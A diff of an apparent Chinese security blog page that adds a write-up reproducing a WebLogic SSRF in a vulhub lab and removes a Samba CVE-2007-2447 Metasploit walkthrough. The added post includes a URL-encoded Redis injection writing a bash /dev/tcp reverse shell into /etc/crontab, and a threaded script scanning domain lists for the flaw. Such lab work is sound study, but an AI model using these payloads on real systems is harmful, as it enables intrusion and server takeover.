@@ -756,6 +756,187 @@ if __name__==&quot;__main__&quot;:
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://wcute.github.io/2018/12/09/Weblogic-SSRF-漏洞复现/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="wcute">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="鸡翅儿">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/12/09/Weblogic-SSRF-漏洞复现/" itemprop="url">Weblogic-SSRF-漏洞复现</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-12-09T12:33:03+08:00">
+                2018-12-09
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/漏洞复现/" itemprop="url" rel="index">
+                    <span itemprop="name">漏洞复现</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>关于SSRF漏洞的原理以及利用已经记录过了，可以访问<a href="https://www.jianshu.com/p/6bf7700139fa查看，这次复现一下这个漏洞" target="_blank" rel="noopener">https://www.jianshu.com/p/6bf7700139fa查看，这次复现一下这个漏洞</a></p>
+<p>本次还是利用<code>vulhub</code>进行漏洞复现<hr></p>
+<h4 id="测试环境搭建"><a href="#测试环境搭建" class="headerlink" title="测试环境搭建"></a>测试环境搭建</h4><blockquote>
+<p>docker-compose build<br>docker-compose up -d</p>
+</blockquote>
+<p>访问<code>http://本地ip:7001/uddiexplorer/</code>，即可查看uddiexplorer应用<br><img src="https://upload-images.jianshu.io/upload_images/12585049-68bb4fd2fdf2f855.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1.png"></p>
+<hr>
+
+<h4 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h4><p>SSRF漏洞存在于<code>http://your-ip:7001/uddiexplorer/SearchPublicRegistries.jsp</code>，提交参数值为<code>url:port</code>，根据返回错误不同，可对内网状态进行探测如端口开放状态等</p>
+<ol>
+<li><p>访问一个可以访问的<code>ip:port</code>，一般返回一个状态码，<code>The server at http://192.168.60.168:7001/ returned a 404 error code &amp;#40;Not Found&amp;#41;</code>如图<br><img src="https://upload-images.jianshu.io/upload_images/12585049-db3ef399b2fe3e0c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="2.png"></p>
+</li>
+<li><p>访问一个不存在的端口，将返回<code>but could not connect over HTTP to server</code><br><img src="https://upload-images.jianshu.io/upload_images/12585049-ce451d10f52c5637.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="3.png"></p>
+</li>
+<li>访问一个非http协议，则返回<code>did not have a valid SOAP content-type</code><br><img src="https://upload-images.jianshu.io/upload_images/12585049-61d8b9048224b849.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="4.png"><hr>
+
+
+</li>
+</ol>
+<h4 id="注入HTTP头，利用Redis的反弹shell"><a href="#注入HTTP头，利用Redis的反弹shell" class="headerlink" title="注入HTTP头，利用Redis的反弹shell"></a>注入HTTP头，利用Redis的反弹shell</h4><p>通过SSRF探测内网中的Redis的服务器，如图，<code>172.18.0.2:6379</code>可以连通<br><img src="https://upload-images.jianshu.io/upload_images/12585049-61d8b9048224b849.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="5.png"><br>发送三条Redis的命令，将反弹<code>shell</code>脚本写入<code>/etc/crontab</code></p>
+<blockquote>
+<p>set 1 “\n\n\n\n<em> </em> <em> </em> * root bash -i &gt;&amp; /dev/tcp/监听ip/port 0&gt;&amp;1\n\n\n\n”<br>config set dir /etc/<br>config set dbfilename crontab<br>save</p>
+</blockquote>
+<p>对命令进行URL编码：</p>
+<blockquote>
+<p>test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn<em>%20</em>%20<em>%20</em>%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F<code>监听ip</code>%2F<code>Port</code>%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D</p>
+</blockquote>
+<p>攻击机开启监听，将URL编码后的字符串放在SSRF的域名后面发送，成功反弹shell<br><img src="https://upload-images.jianshu.io/upload_images/12585049-094f19d1f8faf3c1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.png"></p>
+<p>补充：</p>
+<ul>
+<li>/ etc / crontab这个是肯定的</li>
+<li>/etc/cron.d/*将任意文件写到该目录下，效果和crontab相同，格式也要和/ etc / crontab相同。漏洞利用这个目录，可以做到不覆盖任何其他文件的情况进行反弹。</li>
+<li>/ var / spool / cron / root centos系统下root用户的cron文件</li>
+<li>/ var / spool / cron / crontabs / root debian系统下root用户的cron文件</li>
+</ul>
+<hr>
+
+<p>附上大佬<code>weblogic ssrf</code>检测脚本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">import re</span><br><span class="line">import sys</span><br><span class="line">import Queue</span><br><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line">from requests.packages.urllib3.exceptions import InsecureRequestWarning</span><br><span class="line">requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line">queue = Queue.Queue()</span><br><span class="line">mutex = threading.Lock()</span><br><span class="line"></span><br><span class="line">class Weblogic_SSRF_Check(threading.Thread):</span><br><span class="line">    &quot;&quot;&quot;docstring for Weblogic_SSRF_Check&quot;&quot;&quot;</span><br><span class="line">    def __init__(self, queue):</span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.queue = queue</span><br><span class="line"></span><br><span class="line">    def check(self,domain,ip):</span><br><span class="line">        payload = &quot;uddiexplorer/SearchPublicRegistries.jsp?operator=&#123;ip&#125;&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&quot;.format(ip=ip)</span><br><span class="line">        url = domain + payload</span><br><span class="line"></span><br><span class="line">        try:</span><br><span class="line">            html = requests.get(url=url, timeout=15, verify=False).content</span><br><span class="line"></span><br><span class="line">            m = re.search(&apos;weblogic.uddi.client.structures.exception.XML_SoapException&apos;,html)</span><br><span class="line">            if m:</span><br><span class="line">                mutex.acquire()</span><br><span class="line">                with open(&apos;ssrf.txt&apos;,&apos;a+&apos;) as f:</span><br><span class="line">                    print &quot;%s has weblogic ssrf.&quot; % domain</span><br><span class="line">                    f.write(&quot;%s has weblogic ssrf.\n&quot; % domain)</span><br><span class="line">                mutex.release()</span><br><span class="line">        except Exception,e:</span><br><span class="line">            pass</span><br><span class="line"></span><br><span class="line">    def get_registry(self,domain):</span><br><span class="line">        payload = &apos;uddiexplorer/SetupUDDIExplorer.jsp&apos;</span><br><span class="line">        url = domain + payload</span><br><span class="line"></span><br><span class="line">        try:</span><br><span class="line">            html = requests.get(url=url, timeout=15, verify=False).content</span><br><span class="line">            m = re.search(&apos;&lt;i&gt;For example: (.*?)/uddi/uddilistener.*?&lt;/i&gt;&apos;,html)</span><br><span class="line">            if m:</span><br><span class="line">                return m.group(1)</span><br><span class="line">        except Exception,e:</span><br><span class="line">            pass</span><br><span class="line"></span><br><span class="line">    def run(self):</span><br><span class="line">        while not self.queue.empty():</span><br><span class="line">            domain = self.queue.get()</span><br><span class="line">            mutex.acquire()</span><br><span class="line">            print domain</span><br><span class="line">            mutex.release()</span><br><span class="line">            ip = self.get_registry(domain)</span><br><span class="line">            self.check(domain,ip)</span><br><span class="line"></span><br><span class="line">            self.queue.task_done()</span><br><span class="line"></span><br><span class="line"># domain.txt 存放要检测的ip</span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    with open(&apos;domain.txt&apos;,&apos;r&apos;) as f:</span><br><span class="line">        lines = f.readlines()</span><br><span class="line">    for line in lines:</span><br><span class="line">        queue.put(line.strip())</span><br><span class="line"></span><br><span class="line">    for x in xrange(1,50):</span><br><span class="line">        t = Weblogic_SSRF_Check(queue)</span><br><span class="line">        t.setDaemon(True)</span><br><span class="line">        t.start()</span><br><span class="line">    queue.join()</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/12585049-8bea0efc5ad86b6a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="7.png"></p>
+<p><hr><br>参考链接：<br><a href="http://wyb0.com/posts/weblogic-ssrf-check/" target="_blank" rel="noopener">http://wyb0.com/posts/weblogic-ssrf-check/</a><br><a href="https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf</a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://wcute.github.io/2018/12/09/Django---简单博客搭建（Django安装）/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
@@ -913,198 +1094,6 @@ if __name__==&quot;__main__&quot;:
 <li>打开浏览器，访问 <a href="http://127.0.0.1:8000/index/" target="_blank" rel="noopener">http://127.0.0.1:8000/index/</a></li>
 </ol>
 <p><img src="https://upload-images.jianshu.io/upload_images/12585049-4b20e6314620a2da.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="2.png"></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://wcute.github.io/2018/12/09/Samba远程Shell命令注入执行漏洞（CVE-2007-2447）/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="wcute">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="鸡翅儿">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/12/09/Samba远程Shell命令注入执行漏洞（CVE-2007-2447）/" itemprop="url">Samba远程Shell命令注入执行漏洞（CVE-2007-2447）</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-12-09T12:33:03+08:00">
-                2018-12-09
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
-                  <a href="/categories/漏洞复现/" itemprop="url" rel="index">
-                    <span itemprop="name">漏洞复现</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>usermap_script：CVE-2007-2447<br>Samba用户名映射脚本命令执行</p>
-<h4 id="漏洞产生原因"><a href="#漏洞产生原因" class="headerlink" title="漏洞产生原因"></a>漏洞产生原因</h4><p>传递通过MS-RPC提供的未过滤的用户输入在调用定义的外部脚本时调用/bin/sh，在smb.conf中，导致允许远程命令执行。</p>
-<h4 id="msf-中模块位置"><a href="#msf-中模块位置" class="headerlink" title="msf 中模块位置"></a>msf 中模块位置</h4><blockquote>
-<p>exploit/multi/samba/usermap_script</p>
-</blockquote>
-<p>这个模块利用漏洞执行命令，在Samba版本3.0.20到3.0.25rc3当使用非默认用户名映射脚本配置选项。<br>通过指定一个用户名包含shell元字符,攻击者可以执行任意命令。<br>不需要身份验证来利用此漏洞，因为此选项用于在身份验证之前映射用户名</p>
-<h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>攻击机 kali<br>IP 192.168.195.133</p>
-<p>靶机 Metasploitable_ubuntu<br>IP 192.168.195.132</p>
-<ol>
-<li>搜索有关<code>samba</code>漏洞的代码库<blockquote>
-<p>search samba</p>
-</blockquote>
-</li>
-<li>使用<code>usermap_script</code>代码<blockquote>
-<p>use exploit/multi/samba/usermap_script</p>
-</blockquote>
-</li>
-</ol>
-<p><img src="https://upload-images.jianshu.io/upload_images/12585049-8805e6ee37bebf29.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1.png"></p>
-<ol start="3">
-<li>查看攻击载荷 <blockquote>
-<p>show payloads</p>
-</blockquote>
-</li>
-</ol>
-<p>并选择bind_netcat即使用netcat工具在渗透攻击成功后执行shell并通过netcat绑定在一个监听端口上</p>
-<blockquote>
-<p>set payload cmd/unix/bind_netcat</p>
-</blockquote>
-<p><img src="https://upload-images.jianshu.io/upload_images/12585049-cf8879b9a08ad902.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="2.png"></p>
-<ol start="4">
-<li>查看参数配置<blockquote>
-<p>show options</p>
-</blockquote>
-</li>
-</ol>
-<p><img src="https://upload-images.jianshu.io/upload_images/12585049-7d20c70d09d1e160.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="3.png"></p>
-<ol start="5">
-<li>设置目标<code>ip</code><blockquote>
-<p>set RHOST 192.168.195.132</p>
-</blockquote>
-</li>
-</ol>
-<p><img src="https://upload-images.jianshu.io/upload_images/12585049-b4e95900980507e4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="4.png"></p>
-<ol start="6">
-<li>执行<code>exploit</code>成功获取靶机<code>shell</code><blockquote>
-<p>exploit</p>
-</blockquote>
-</li>
-</ol>
-<p><img src="https://upload-images.jianshu.io/upload_images/12585049-926ca534e06b2225.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="5.png"></p>
 
           
         
@@ -2043,8 +2032,8 @@ if __name__==&quot;__main__&quot;:
               
               
                 <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
-                  <a href="/categories/内网渗透/" itemprop="url" rel="index">
-                    <span itemprop="name">内网渗透</span>
+                  <a href="/categories/靶机测试/" itemprop="url" rel="index">
+                    <span itemprop="name">靶机测试</span>
                   </a>
                 </span>
 
@@ -2209,7 +2198,7 @@ if __name__==&quot;__main__&quot;:
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">25</span>
+                  <span class="site-state-item-count">27</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -2220,7 +2209,7 @@ if __name__==&quot;__main__&quot;:
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-count">7</span>
                   <span class="site-state-item-name">categories</span>
                 </a>
               </div>
